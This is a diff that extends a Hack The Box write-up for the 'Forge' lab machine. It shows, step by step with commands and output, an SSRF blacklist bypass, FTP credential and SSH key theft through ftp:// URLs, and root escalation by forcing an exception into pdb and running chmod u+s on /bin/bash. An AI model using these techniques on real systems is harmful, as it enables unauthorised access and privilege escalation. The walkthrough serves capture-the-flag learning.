@@ -1,5 +1,5 @@
 ## Default Information
-IP address : 10.10.11.101\
+IP address : 10.10.11.111\
 OS : Linux
 
 ## Enumeration
@@ -104,5 +104,181 @@ We notice that upon a successful file upload from local file, we are presented w
 
 ![Burp output](https://github.com/joelczk/writeups/blob/main/HTB/Images/forge/local_file_upload_burp.PNG)
 
-Next, we will test out file upload by url. We will first try to use http://localhost as the url. However, we realize that this url is blacklisted and we are unable to access it. Similarly, when we try to use http://admin.forge.htb as the URL we will also realize that the url is blacklisted and we are unable to access it.
+Next, we will test out file upload by url. We will first try to use http://localhost as the input url. However, we realize that this url is blacklisted and we are unable to access it. Similarly, when we try to use http://admin.forge.htb as the input url we will also realize that the url is blacklisted and we are unable to access it.
 
+However, we realize that we are able to bypass the blacklist by slightly modifying the input url into http://admin.Forge.htb. Afterwhich, we will try to ```curl``` the url that was given to us and we would realize that there are 2 endpoints, ```/announcements``` and ```/upload``` on http://admin.forge.htb
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://forge.htb/uploads/HyDAiKFTOMSZHPgGqeTL
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Portal</title>
+</head>
+<body>
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <header>
+            <nav>
+                <h1 class=""><a href="/">Portal home</a></h1>
+                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <br><br><br><br>
+    <br><br><br><br>
+    <center><h1>Welcome Admins!</h1></center>
+</body>
+</html> 
+```
+
+Next, we will modify the url to become http://admin.Forge.htb/announcements```, and curling the url that was given to us, we are able to obtain the credentials for our FTP server. We also realized that we can upload images to the endpoint by passing a url with ```/uploads?u=<url>```. This might contain open redirect vulnerabilities if the url used in the parameters are not properly sanitized.
+
+![FTP Credentials](https://github.com/joelczk/writeups/blob/main/HTB/Images/forge/credentials.PNG)
+  
+Now, we will change the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost and curl the url obtained. We would realize that we would obtain a directory listing of the current directory in the FTP server.
+  
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://forge.htb/uploads/TMHWQcZBLTlN0DPvha4q
+drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
+-rw-r-----    1 0        1000           33 Sep 26 00:57 user.txt
+```
+
+## Obtaining user flag
+
+All that is left for us to do is to modify the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost/user.txt and curl the obtained url to get the user flag.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl http://forge.htb/uploads/jSUOzXI4ZbmjMSoqJvXs
+<Redacted user flag>
+```
+  
+## Obtaining root flag
+
+To obtain the root flag, we need to be able to first SSH into the server. To do that, we need to first obtain the private key that is used for SSH from the FTP server. This can be obtained by modifying the input url to http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@localHost/.ssh/id_rsa. Curling the url that is given to us would then give us the private key that is needed for SSH.
+
+We would then save the private key and SSH into the server using the username, ```user```. 
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh -i id_rsa user@10.10.11.111
+
+Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
+user@forge:~$ 
+```
+  
+Now, we will check for programs or scripts that can be executed with root privileges without password. This can be checked using ```sudo -l```. Here, we realize that ```/usr/bin/python3 /opt/remote-manage``` can be executed with root privileges without the need for any password.
+
+```
+user@forge:~$ sudo -l
+Matching Defaults entries for user on forge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands on forge:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+```
+  
+Next, we will examine ```/opt/remote-manage.py``` in detail. There are 2 main portions in the code, namely the ```try``` part of the code and the ```except``` part of the code. Let's first examine the ```try``` portion of the code.
+  
+In the ```try``` protion, we realize that the socket will request for a secret password, which is ```secretadminpassword```. If the secret password has been verified successfully, the code will display out a few options that will execute ```pas aux```, ```df``` and ```ss -lnt``` respectively. 
+
+We also noticed that the selection of options after successfully logging into the server will require the user to input an integer value due to ```option = int(clientsock.recv(1024).strip())```, if not an exception will be thrown.
+
+```
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+sock.bind(('127.0.0.1', port))
+sock.listen(1)
+print(f'Listening on localhost:{port}')
+(clientsock, addr) = sock.accept()
+clientsock.send(b'Enter the secret passsword: ')
+    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
+        clientsock.send(b'Wrong password!\n')
+    else:
+        clientsock.send(b'Welcome admin!\n')
+while True:
+    clientsock.send(b'\nWhat do you wanna do: \n')
+    clientsock.send(b'[1] View processes\n')
+    clientsock.send(b'[2] View free memory\n')
+    clientsock.send(b'[3] View listening sockets\n')
+    clientsock.send(b'[4] Quit\n')
+    option = int(clientsock.recv(1024).strip())
+    if option == 1:
+        clientsock.send(subprocess.getoutput('ps aux').encode())
+    elif option == 2:
+        clientsock.send(subprocess.getoutput('df').encode())
+    elif option == 3:
+        clientsock.send(subprocess.getoutput('ss -lnt').encode())
+    elif option == 4:
+        clientsock.send(b'Bye\n')
+        break
+```
+  
+In the ```except``` portion of the code, we realize that we are able to enter the pdb debugger if an exception is raised.
+  
+```
+except Exception as e:
+    print(e)
+    pdb.post_mortem(e.__traceback__)
+```
+
+Before, we execute the script, lets's check the file permissions of ```/bin/bash```. We notice that the file owner of ```/bin/bash``` is root.
+  
+```
+user@forge:~$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+```
+  
+Now, we will execute the code using and we will take note of the port number that the localhost is listening on.
+
+```
+user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+Listening on localhost:1123
+```
+  
+Afterwards, we will open another terminal and SSH into the server and use netcat to create a reverse connection to the localhost, and enter the secret password to view the given options. Afterwards, we will then input a string to create an exception so that we can enter the debugger
+  
+```
+user@forge:~$ nc localhost 1089
+Enter the secret passsword: secretadminpassword
+Welcome admin!
+
+What do you wanna do: 
+[1] View processes
+[2] View free memory
+[3] View listening sockets
+[4] Quit
+sdsdsdsdsdsd
+```
+
+After entering the debugger, we will modify the ```/bin/bash``` permissions with ```chmod u+s```. This gives ```/bin/bash```setuid attributes which will then allow any user who are able to execute the file to be able to execute the files with the privileges of the file's owners, which in this case is the root user. This will allow us to execute the ```/bin/bash``` binary with root privileges and obtain our system flag.
+  
+```
+user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+Listening on localhost:54071
+invalid literal for int() with base 10: b'sdsdsdsdsd'
+> /opt/remote-manage.py(27)<module>()
+-> option = int(clientsock.recv(1024).strip())
+(Pdb) import os
+(Pdb) os.system('chmod u+s /bin/bash')
+0
+(Pdb) exit
+```
+  
+Now, all we have to do is to create a bash shell and obtain the system flag.
+  
+```
+user@forge:~$ /bin/bash -p
+bash-5.0# id
+uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
+bash-5.0# cd root
+bash: cd: root: No such file or directory
+bash-5.0# find root.txt
+find: ‘root.txt’: No such file or directory
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+<Redacted system flag>
+```
